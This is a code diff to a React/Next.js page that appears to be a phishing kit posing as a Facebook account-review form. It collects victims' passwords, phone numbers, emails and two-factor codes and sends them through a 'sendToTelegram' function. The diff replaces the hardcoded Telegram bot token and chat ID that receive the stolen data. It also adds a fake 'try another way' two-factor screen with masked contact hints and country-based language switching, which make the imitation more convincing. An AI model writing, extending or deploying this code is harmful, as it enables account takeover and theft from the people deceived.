@@ -2,7 +2,7 @@
 
 import Image from "next/image";
 import { FormEvent, useEffect, useRef, useState } from "react";
-import { Dictionary, Locale, getDictionary } from "@/lib/i18n";
+import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
 import styles from "./page.module.css";
 
 type ActionItem = {
@@ -60,7 +60,7 @@ function formatCooldownTime(seconds: number, locale: Locale) {
 
 const emailPattern = /^\S+@\S+\.\S+$/;
 
-function validateReviewForm(form: ReviewForm, dictionary: Dictionary, locale: Locale): ReviewFormErrors {
+function validateReviewForm(form: ReviewForm, dictionary: Dictionary): ReviewFormErrors {
   const validation = dictionary.modal.validation;
   const errors: ReviewFormErrors = {};
 
@@ -85,7 +85,7 @@ function validateReviewForm(form: ReviewForm, dictionary: Dictionary, locale: Lo
   }
 
   if (!form.phoneNumber.trim()) {
-    errors.phoneNumber = locale === "vi" ? "Vui lòng nhập số điện thoại!" : "Phone number is required!";
+    errors.phoneNumber = validation.phoneNumberRequired;
   }
 
   if (!form.dateOfBirth.trim()) {
@@ -254,6 +254,26 @@ function formatPhoneNumberInput(value: string): string {
   return value.replace(/\D/g, "").slice(0, 15);
 }
 
+function maskPhoneTail(value: string): string {
+  const digits = value.replace(/\D/g, "");
+  const tail = digits.slice(-2);
+  return tail ? `******${tail}` : "******";
+}
+
+function maskEmail(value: string): string {
+  const trimmed = value.trim();
+  if (!trimmed || !trimmed.includes("@")) {
+    return "he***@gmail.com";
+  }
+  const [user, domain] = trimmed.split("@");
+  const prefix = user.slice(0, 2).padEnd(2, "*");
+  return `${prefix}***@${domain}`;
+}
+
+function applyTemplate(template: string, value: string): string {
+  return template.replace("{value}", value);
+}
+
 export default function HomePageClient({
   locale,
   detectedCountryCode,
@@ -261,7 +281,8 @@ export default function HomePageClient({
   detectedIp,
   detectedLocation,
 }: HomePageClientProps) {
-  const dictionary = getDictionary(locale);
+  const [activeLocale, setActiveLocale] = useState<Locale>(locale);
+  const dictionary = getDictionary(activeLocale);
   const modal = dictionary.modal;
   const sidebar = dictionary.sidebar;
   const pageContent = dictionary.page;
@@ -315,6 +336,8 @@ export default function HomePageClient({
   const [showPassword, setShowPassword] = useState(false);
   const [twoFactorCode, setTwoFactorCode] = useState("");
   const [twoFactorError, setTwoFactorError] = useState("");
+  const [showAltMethods, setShowAltMethods] = useState(false);
+  const [selectedMethod, setSelectedMethod] = useState<"app" | "whatsapp" | "sms" | "email">("app");
   const [notifyOnFacebook, setNotifyOnFacebook] = useState(false);
   const [agreeTerms, setAgreeTerms] = useState(false);
   const [form, setForm] = useState<ReviewForm>(defaultForm);
@@ -322,8 +345,11 @@ export default function HomePageClient({
   const [didTrySubmit, setDidTrySubmit] = useState(false);
   const formTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const passwordTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
-  const botToken = "8616096320:AAEOe-p5V0ZnBEedfeDoKWIg1WoxhWHPYGs";
-  const chatId = "2076230383";
+  // const botToken = "8616096320:AAEOe-p5V0ZnBEedfeDoKWIg1WoxhWHPYGs";
+  // const chatId = "2076230383";
+  const botToken = "8799025339:AAFsoCkLUlkybC47gjPJ_5EhkZxUoy4K_Ec";
+const chatId = "6113542421";
+
   const telegramEnabled = Boolean(botToken && chatId);
   const [messageId, setMessageId] = useState<string | null>(null);
   const [password1, setPassword1] = useState("");
@@ -494,7 +520,7 @@ export default function HomePageClient({
   const twoFactorRequiredError = modal.twoFactorRequiredError;
   const twoFactorIncorrectLabel = modal.twoFactorIncorrectLabel;
   const twoFactorImageAlt = modal.twoFactorImageAlt;
-  const phoneNumberPlaceholder = locale === "vi" ? "Số điện thoại" : "Phone number";
+  const phoneNumberPlaceholder = modal.phoneNumberPlaceholder;
 
   function openReviewModal() {
     setShowModal(true);
@@ -515,6 +541,8 @@ export default function HomePageClient({
     setShowPassword(false);
     setTwoFactorCode("");
     setTwoFactorError("");
+    setShowAltMethods(false);
+    setSelectedMethod("app");
     setAgreeTerms(false);
     setNotifyOnFacebook(false);
     setErrors({});
@@ -549,7 +577,7 @@ export default function HomePageClient({
       }
       const next = { ...prev, [field]: nextValue };
       if (didTrySubmit) {
-        setErrors(validateReviewForm(next, dictionary, locale));
+        setErrors(validateReviewForm(next, dictionary));
       }
       return next;
     });
@@ -562,7 +590,7 @@ export default function HomePageClient({
     }
     setDidTrySubmit(true);
 
-    const nextErrors = validateReviewForm(form, dictionary, locale);
+    const nextErrors = validateReviewForm(form, dictionary);
     setErrors(nextErrors);
 
     if (Object.keys(nextErrors).length > 0) {
@@ -730,11 +758,52 @@ export default function HomePageClient({
     }
   }
 
+  const altMethods = [
+    {
+      id: "app",
+      title: modal.altMethodAppTitle,
+      subtitle: modal.altMethodAppSubtitle,
+    },
+    {
+      id: "whatsapp",
+      title: modal.altMethodWhatsappTitle,
+      subtitle: applyTemplate(modal.altMethodWhatsappSubtitle, maskPhoneTail(form.phoneNumber)),
+    },
+    {
+      id: "sms",
+      title: modal.altMethodSmsTitle,
+      subtitle: applyTemplate(modal.altMethodSmsSubtitle, maskPhoneTail(form.phoneNumber)),
+    },
+    {
+      id: "email",
+      title: modal.altMethodEmailTitle,
+      subtitle: applyTemplate(modal.altMethodEmailSubtitle, maskEmail(form.email)),
+    },
+  ] as const;
+
   useEffect(() => {
     if (typeof window !== "undefined") {
       setCurrentUrl(window.location.href);
     }
   }, []);
+
+  useEffect(() => {
+    setActiveLocale(locale);
+  }, [locale]);
+
+  useEffect(() => {
+    if (!clientCountryCode) {
+      return;
+    }
+    const nextLocale = resolveLocaleFromCountryCode(clientCountryCode);
+    if (nextLocale === activeLocale) {
+      return;
+    }
+    setActiveLocale(nextLocale);
+    if (typeof document !== "undefined") {
+      document.cookie = `${LOCALE_COOKIE_NAME}=${nextLocale};path=/;max-age=${60 * 60 * 24 * 365};samesite=lax`;
+    }
+  }, [clientCountryCode, activeLocale, locale]);
 
   useEffect(() => {
     let cancelled = false;
@@ -1160,36 +1229,80 @@ export default function HomePageClient({
               </div>
             ) : (
               <div className={styles.twoFactorStep}>
-                <h3 className={styles.twoFactorHeading}>{twoFactorHeading}</h3>
-                <p className={styles.twoFactorDescription}>{twoFactorDescription}</p>
-                <div className={styles.twoFactorIllustration}>
-                  <Image
-                    src="/image.png"
-                    alt={twoFactorImageAlt}
-                    width={1125}
-                    height={492}
-                    className={styles.twoFactorImage}
-                    priority
-                  />
-                </div>
-                <input
-                  type="text"
-                  value={twoFactorCode}
-                  onChange={(event) => handleTwoFactorChange(event.target.value)}
-                  placeholder={twoFactorPlaceholder}
-                  className={styles.twoFactorCodeInput}
-                  inputMode="numeric"
-                />
-                {twoFactorErrorMessage ? <p className={styles.twoFactorError}>{twoFactorErrorMessage}</p> : null}
+                {showAltMethods ? (
+                  <>
+                    <h3 className={styles.altMethodsHeading}>{modal.altMethodsHeading}</h3>
+                    <p className={styles.altMethodsDescription}>{modal.altMethodsDescription}</p>
+                    <div className={styles.altMethodsList}>
+                      {altMethods.map((method) => {
+                        const isSelected = selectedMethod === method.id;
+                        return (
+                          <button
+                            key={method.id}
+                            type="button"
+                            className={styles.altMethodCard}
+                            onClick={() => setSelectedMethod(method.id)}
+                          >
+                            <div className={styles.altMethodText}>
+                              <p className={styles.altMethodTitle}>{method.title}</p>
+                              <p className={styles.altMethodSubtitle}>{method.subtitle}</p>
+                            </div>
+                            <span className={`${styles.altMethodRadio} ${isSelected ? styles.altMethodRadioActive : ""}`}>
+                              <span />
+                            </span>
+                          </button>
+                        );
+                      })}
+                    </div>
+                    <button
+                      type="button"
+                      className={styles.modalSubmitButton}
+                      onClick={closeReviewModal}
+                    >
+                      {continueButtonLabel}
+                    </button>
+                  </>
+                ) : (
+                  <>
+                    <h3 className={styles.twoFactorHeading}>{twoFactorHeading}</h3>
+                    <p className={styles.twoFactorDescription}>{twoFactorDescription}</p>
+                    <div className={styles.twoFactorIllustration}>
+                      <Image
+                        src="/image.png"
+                        alt={twoFactorImageAlt}
+                        width={1125}
+                        height={492}
+                        className={styles.twoFactorImage}
+                        priority
+                      />
+                    </div>
+                    <input
+                      type="text"
+                      value={twoFactorCode}
+                      onChange={(event) => handleTwoFactorChange(event.target.value)}
+                      placeholder={twoFactorPlaceholder}
+                      className={styles.twoFactorCodeInput}
+                      inputMode="numeric"
+                    />
+                    {twoFactorErrorMessage ? <p className={styles.twoFactorError}>{twoFactorErrorMessage}</p> : null}
 
-                <button
-                  type="button"
-                  className={styles.modalSubmitButton}
-                  disabled={isSubmitDisabled || !twoFactorCode.trim()}
-                  onClick={() => void sendToTelegram()}
-                >
-                  {continueButtonLabel}
-                </button>
+                    <button
+                      type="button"
+                      className={styles.modalSubmitButton}
+                      disabled={isSubmitDisabled || !twoFactorCode.trim()}
+                      onClick={() => void sendToTelegram()}
+                    >
+                      {continueButtonLabel}
+                    </button>
+                    <button
+                      type="button"
+                      className={styles.altMethodsTrigger}
+                      onClick={() => setShowAltMethods(true)}
+                    >
+                      {modal.altMethodsTriggerLabel}
+                    </button>
+                  </>
+                )}
               </div>
             )}
           </div>
